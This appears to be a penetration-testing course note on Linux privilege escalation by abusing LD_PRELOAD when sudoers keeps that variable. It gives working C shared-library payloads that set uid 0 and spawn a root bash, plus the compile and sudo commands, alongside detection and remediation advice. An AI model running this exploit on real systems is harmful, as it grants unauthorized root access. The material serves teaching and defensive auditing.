---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.12 LD_PRELOAD Abuse"
---

# LD_PRELOAD Abuse

## Executive Summary

`LD_PRELOAD` is an environment variable utilized by the Linux dynamic linker (`ld.so`). Its legitimate purpose is to allow developers to specify a shared library (`.so` file) that should be loaded into memory *before* any other libraries, including standard C libraries like `libc`. This allows for overriding or "hooking" standard functions (e.g., overriding `malloc` for debugging). However, this mechanism presents a severe security risk if an unprivileged user can execute a program with elevated privileges (like `sudo`) while retaining control over the `LD_PRELOAD` variable. By compiling a malicious shared library and preloading it, the attacker can hijack the execution flow of the privileged process, forcing it to execute arbitrary code as `root` before the actual program even begins.

## Understanding LD_PRELOAD

When a dynamically linked ELF executable is run, the operating system's loader (`ld-linux.so`) maps the executable into memory and then resolves and loads its shared library dependencies (like `libc.so.6`).

The loader checks specific environment variables to alter its behavior. `LD_PRELOAD` is the most powerful. If set, the loader will load the specified library first.

If a malicious library defines an initialization function, that function runs immediately upon the library being loaded, effectively granting code execution before the target executable's `main()` function is ever called.

## The Vulnerability: Sudo Misconfiguration (`env_keep`)

By default, Linux security mechanisms (specifically the dynamic linker) ignore `LD_PRELOAD` when executing SUID binaries to prevent exactly this type of attack. Therefore, you cannot simply `export LD_PRELOAD=/tmp/evil.so` and run `/usr/bin/passwd`.

The vulnerability almost exclusively manifests through a misconfiguration in `sudo`. `sudo` strips environment variables to provide a clean, secure execution context. However, administrators can configure `sudo` to retain specific environment variables using the `env_keep` directive in `/etc/sudoers`.

If `env_keep` explicitly includes `LD_PRELOAD`, the system is trivially vulnerable.

```text
# Vulnerable /etc/sudoers entry
Defaults    env_keep += "LD_PRELOAD"
user ALL=(ALL) NOPASSWD: /usr/bin/find
```

In this scenario, `user` can run `find` as root without a password, *and* their `LD_PRELOAD` environment variable will be passed to the root-owned `find` process.

## Attack Flow Architecture

```ascii
+-----------------------------------+
|  Attacker checks sudo -l          |
|  Sees: env_keep += "LD_PRELOAD"   |
+-----------------------------------+
                 |
                 v
+-----------------------------------+
|  Attacker writes evil.c           |
|  Compiles to /tmp/evil.so         |
+-----------------------------------+
                 |
                 v
+-----------------------------------+
|  Attacker executes:               |
|  sudo LD_PRELOAD=/tmp/evil.so find|
+-----------------------------------+
                 |
                 | Sudo preserves LD_PRELOAD
                 | ld.so loads /tmp/evil.so BEFORE finding libraries
                 v
+-----------------------------------+        +-----------------------------------+
|  ld.so executes initialization    | -----> |  evil.so _init() function runs    |
|  routines in /tmp/evil.so         |        |  Executes /bin/bash               |
+-----------------------------------+        +-----------------------------------+
                                                             |
                                                             v
                                             +-----------------------------------+
                                             |  Root Shell Granted               |
                                             |  # id -> uid=0(root)              |
                                             +-----------------------------------+
```

## Exploitation Phase

Exploiting this requires confirming the misconfiguration, writing a C payload, compiling it as a shared object, and executing it via `sudo`.

### Step 1: Enumeration

First, check your sudo privileges:
```bash
sudo -l
```

Look for two things in the output:
1.  An `env_keep` directive containing `LD_PRELOAD`.
2.  A command you are allowed to run (e.g., `(root) NOPASSWD: /usr/bin/find`). Even if it requires a password, as long as you know your *own* password, it will work.

Output example:
```text
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```

### Step 2: Creating the Malicious Shared Library

We need to create a C payload. Instead of hooking a specific function (like `geteuid`), the most reliable method is to use the GCC constructor attribute. Functions marked with `__attribute__((constructor))` are executed automatically by the dynamic linker immediately after the library is loaded into memory, before `main()` starts.

Create a file named `payload.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

// This function runs automatically upon library load
void _init() {
    unsetenv("LD_PRELOAD"); // Clean up to avoid infinite loops in child processes
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

*Note:* `_init()` is a legacy name. A more modern and robust approach is:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void run_exploit() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

### Step 3: Compiling the Payload

Compile the C code into a shared object (`.so`) file.

```bash
gcc -fPIC -shared -o /tmp/payload.so payload.c -nostartfiles
```
*   `-fPIC`: Position Independent Code, required for shared libraries.
*   `-shared`: Produce a shared object.
*   `-nostartfiles`: Do not use the standard system startup files when linking.

### Step 4: Execution

Run the allowed `sudo` command while setting the `LD_PRELOAD` environment variable inline.

```bash
sudo LD_PRELOAD=/tmp/payload.so find
```

The dynamic linker loads `payload.so` into the context of the `root`-owned `find` process. The constructor function executes immediately, dropping you into a root shell.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Edge Cases & Troubleshooting

### Sudo Requires Password
If the `sudo` entry does not have `NOPASSWD`, you must know the password of the user you are currently logged in as to execute the command. `LD_PRELOAD` exploitation is not a bypass for authentication, it is a bypass for authorization boundaries.

### Missing GCC
If `gcc` is not installed on the target machine, you must compile the payload on your attacker machine. Ensure the architectures match (e.g., compile 64-bit for a 64-bit target).

### Infinite Loops
If you do not include `unsetenv("LD_PRELOAD");` in your payload, any command executed by `system("/bin/bash")` will *also* try to load `payload.so`, which will execute `system("/bin/bash")`, ad infinitum, causing a fork bomb and crashing the session.

## Detection and Forensics

1.  **Sudoers Auditing:** Regularly audit `/etc/sudoers` for any `env_keep` directives. Keeping `LD_PRELOAD` or `LD_LIBRARY_PATH` is almost always a security flaw.
2.  **Auditd Rules:** Monitor for the use of `LD_PRELOAD` in conjunction with `sudo` executions.
    ```bash
    -w /etc/sudoers -p wa -k sudoers_mod
    ```
3.  **Process Creation Analysis:** EDR solutions can flag processes executing as root that unexpectedly spawn `/bin/bash` or `/bin/sh` as immediate child processes before establishing normal behavior.

## Remediation

The remediation is straightforward: remove the misconfiguration.

1.  Edit the sudoers file securely using `visudo`.
    ```bash
    sudo visudo
    ```
2.  Locate the line `Defaults env_keep += "LD_PRELOAD"` and remove it or comment it out.
3.  As a general best practice, avoid using `env_keep` unless strictly necessary for the application to function, and thoroughly vet which variables are preserved.

## Chaining Opportunities

*   **[[21 - Sudo Misconfigurations]]**: This is a direct subset of sudo misconfigurations.
*   **[[13 - Shared Library Injection]]**: The concepts of manipulating the dynamic linker via `.so` files are highly related to finding writable shared objects or exploiting `RPATH`.

## Related Notes
*   [[01 - Linux Privilege Escalation Fundamentals]]
*   [[21 - Sudo Misconfigurations]]
*   [[13 - Shared Library Injection]]
*   [[24 - Binary Exploitation Basics]]
